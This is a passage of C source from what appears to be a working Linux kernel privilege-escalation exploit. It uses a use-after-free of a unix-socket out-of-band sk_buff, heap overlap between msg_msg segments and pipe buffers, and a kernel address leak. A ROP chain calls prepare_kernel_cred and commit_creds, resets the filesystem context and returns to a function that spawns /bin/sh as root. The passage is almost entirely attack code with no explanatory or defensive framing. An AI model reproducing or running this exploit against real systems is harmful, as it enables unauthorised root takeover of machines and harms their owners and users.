				kmalloc_cg_2k_addr = (u64)(edges.next) - STRUCT_unix_edge_MEMBER_vertex_entry_OFFSET;
				printf("[+] kmalloc_cg_2k_addr: 0x%016lx\n", kmalloc_cg_2k_addr);
				found_kmalloc_cg_2k_address = true;
			}
		}

		if (!found_kmalloc_cg_2k_address) {
			Close(dgram_unix_socketpair[0]);
			Close(dgram_unix_socketpair[1]);
		}
	}

	*(u64 *)(fake_skb + STRUCT_SK_BUFF_MEMBER_next_OFFSET) = kmalloc_cg_2k_addr + 8;
	*(u64 *)(fake_skb + STRUCT_SK_BUFF_MEMBER_prev_OFFSET) = kmalloc_cg_2k_addr + 8;
	*(u32 *)(fake_skb + STRUCT_SK_BUFF_MEMBER_users_OFFSET) = 1;
	//*(u64 *)(fake_skb + STRUCT_SK_BUFF_MEMBER_destructor_OFFSET) = 0x4141414141414141UL;

	Close(dgram_unix_socketpair[0]);
	Close(dgram_unix_socketpair[1]);

	Msgsnd(qid, msg_buffer, DATALEN_MSG + KMALLOC_CG_2K_SIZE - sizeof(struct msg_msgseg), 0);

	u8 kmalloc_cg_2k_leak_buffer[KMALLOC_CG_2K_SIZE] = {};
	abr_read(kmalloc_cg_2k_addr, kmalloc_cg_2k_leak_buffer, KMALLOC_CG_2K_SIZE);

	fake_skb = (uintptr_t)(kmalloc_cg_2k_leak_buffer + 8);

	u64 fake_skb_next = *(u64 *)(fake_skb + STRUCT_SK_BUFF_MEMBER_next_OFFSET);
	u64 fake_skb_prev = *(u64 *)(fake_skb + STRUCT_SK_BUFF_MEMBER_prev_OFFSET);

	if (fake_skb_next != fake_skb_prev || fake_skb_next != kmalloc_cg_2k_addr + 8) {
		Msgctl(qid, IPC_RMID, NULL);
		return false;
	}

	printf("[+] fake skb next: 0x%016lx\n", fake_skb_next);
	printf("[+] fake skb prev: 0x%016lx\n", fake_skb_prev);

	*out_qid = qid;
	*out_msg_msgseg_addr = kmalloc_cg_2k_addr;
	return true;
}

void overlap_msg_msgseg_with_pipe_buffer(int victim_fd, int qid, u64 fake_skb_addr, int out_pipe_fd[2])
{
	int pipe_fd[2] = {};
	Pipe(pipe_fd);

	u8 page_buffer[PAGE_SIZE] = {};
	u32 skb_len = 1;
	uaf_oob_skb_overwrite_prepare_page_buffer(
		page_buffer,
		STRUCT_SK_BUFF_MEMBER_LEN_OFFSET,
		&skb_len,
		sizeof(skb_len)
	);

	u32 skb_data_len = 0;
	uaf_oob_skb_overwrite_prepare_page_buffer(
		page_buffer,
		STRUCT_SK_BUFF_MEMBER_DATA_LEN_OFFSET,
		&skb_data_len,
		sizeof(skb_data_len)
	);

	u8 dummy = 0;
	u64 skb_data = (u64)&dummy;
	uaf_oob_skb_overwrite_prepare_page_buffer(
		page_buffer,
		STRUCT_SK_BUFF_MEMBER_DATA_OFFSET,
		&skb_data,
		sizeof(skb_data)
	);	

	u64 skb_next = fake_skb_addr;
	uaf_oob_skb_overwrite_prepare_page_buffer(
		page_buffer,
		STRUCT_SK_BUFF_MEMBER_next_OFFSET,
		&skb_next,
		sizeof(skb_next)
	);

	u64 skb_prev = fake_skb_addr;
	uaf_oob_skb_overwrite_prepare_page_buffer(
		page_buffer,
		STRUCT_SK_BUFF_MEMBER_prev_OFFSET,
		&skb_prev,
		sizeof(skb_prev)
	);	

	uaf_oob_skb_overwrite_trigger(page_buffer);
	Recv(g_victim_sockfd, &dummy, 1, MSG_OOB);

	Fcntl(pipe_fd[1], F_SETPIPE_SZ, PAGE_SIZE * 26);

	u8 msg_buffer[MSG_BUFFER_SIZE_MAX] = {};
	Write(pipe_fd[1], &dummy, 1);

	/*
	Msgrcv(
		qid,
		&msg_buffer,
		DATALEN_MSG + KMALLOC_CG_2K_SIZE - sizeof(struct msg_msgseg),
		0,
		IPC_NOWAIT | MSG_NOERROR | MSG_COPY
	);

	struct msgbuf *msg = (struct msgbuf *)msg_buffer;

	struct pipe_buffer *pipe_buffer = (struct pipe_buffer *)(msg->mtext + DATALEN_MSG);
	pipe_buffer_dump(pipe_buffer);
	*/

	out_pipe_fd[0] = pipe_fd[0];
	out_pipe_fd[1] = pipe_fd[1];
}

void trigger_code_execution(int qid, int pipe_fd[2], u64 msg_msgseg_addr)
{
	u8 msg_buffer[MSG_BUFFER_SIZE_MAX] = {};
	struct msgbuf *msg = (struct msgbuf *)msg_buffer;
	msg->mtype = 1;
	
	void *buffer_start = (void *)(msg->mtext + DATALEN_MSG);
	void *buffer_end = (void *)(msg->mtext + DATALEN_MSG + KMALLOC_CG_2K_SIZE - sizeof(struct msg_msgseg));

	struct pipe_buf_operations *pipe_buf_operations = (struct pipe_buf_operations *)
		((uintptr_t)(buffer_end) - sizeof(struct pipe_buf_operations));

	pipe_buf_operations->release = (void *)push_rdx_pop_rsp_ret;

	struct pipe_buffer *fake_pipe_buffer = (struct pipe_buffer *)buffer_start;
	fake_pipe_buffer->ops = (void *)(msg_msgseg_addr + KMALLOC_CG_2K_SIZE - sizeof(struct pipe_buf_operations));
	
	u64 *rop = (u64 *)buffer_start;
	rop[0] = add_rsp_0x10_ret;
	rop[3] = pop_rdi_ret;
	rop[4] = 0;
	rop[5] = prepare_kernel_cred;
	rop[6] = pop_rcx_ret;
	rop[7] = 0;
	rop[8] = mov_rdi_rax_rep_ret;
	rop[9] = commit_creds;
	rop[10] = pop_rdi_ret;
	rop[11] = getpid();
	rop[12] = find_task_by_vpid;
	rop[13] = pop_rcx_ret;
	rop[14] = STRUCT_task_struct_MEMBER_fs_OFFSET;
	rop[15] = add_rax_rcx_ret;
	rop[16] = pop_rsi_ret;
	rop[17] = init_fs;
	rop[18] = mov_qword_ptr_rax_rsi_ret;
	rop[19] = swapgs_restore_regs_and_return_to_usermode_nopop;
	rop[20] = 0; // dummy
	rop[21] = 0; // dummy
	rop[22] = (u64)win;
	rop[23] = user_cs;
	rop[24] = user_rflags;
	rop[25] = user_rsp & 0xffffffffffffff00;
	rop[26] = user_ss;

	u8 tmp_buffer[MSG_BUFFER_SIZE_MAX] = {};
	Msgrcv(qid, &tmp_buffer, DATALEN_MSG + KMALLOC_CG_2K_SIZE - sizeof(struct msg_msgseg), 0, IPC_NOWAIT | MSG_NOERROR);
	Msgsnd(qid, msg_buffer, DATALEN_MSG + KMALLOC_CG_2K_SIZE - sizeof(struct msg_msgseg), 0);

	Close(pipe_fd[0]);
	Close(pipe_fd[1]);
}

void win(void)
{
	char sh_str[] = "sh";
	char *sh_args[] = {sh_str, NULL};
	execve("/bin/sh", sh_args, NULL);
}

void save_state(void)
{
	__asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_rsp, rsp;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
}

int main(void)
{
	save_state();
	pin_thread_on_cpu(0);
	setup_nofile_rlimit();

	int victim_fd = -1;
	int overlap_pipe[2] = {};
	int page_nth = -1;
	int page_offset = -1;
	overlap_oob_skb_with_pipe_page(&victim_fd, overlap_pipe, &page_nth, &page_offset);

	printf("[+] victim_fd: %d\n", victim_fd);
	printf("[+] overlap_pipe[0] = %d\n", overlap_pipe[0]);
	printf("[+] overlap_pipe[1] = %d\n", overlap_pipe[1]);
	printf("[+] page_nth: %d\n", page_nth);
	printf("[+] page_offset: %d\n", page_offset);

	uaf_oob_skb_overwrite_prepare(victim_fd, overlap_pipe, page_nth, page_offset);
	u64 kernel_base = find_kernel_base();

	printf("[+] kernel base: 0x%016lx\n", kernel_base);
	update_kernel_address(kernel_base);

	int fake_skb_qid = -1;
	u64 msg_msgseg_addr = 0;

	while (!setup_fake_skb_with_msg_msgseg(victim_fd, &fake_skb_qid, &msg_msgseg_addr)) {
		;
	}

	int code_execution_pipe_fd[2] = {};
	u64 fake_skb_addr = msg_msgseg_addr + 8;
	overlap_msg_msgseg_with_pipe_buffer(victim_fd, fake_skb_qid, fake_skb_addr, code_execution_pipe_fd);

	trigger_code_execution(fake_skb_qid, code_execution_pipe_fd, msg_msgseg_addr);
}
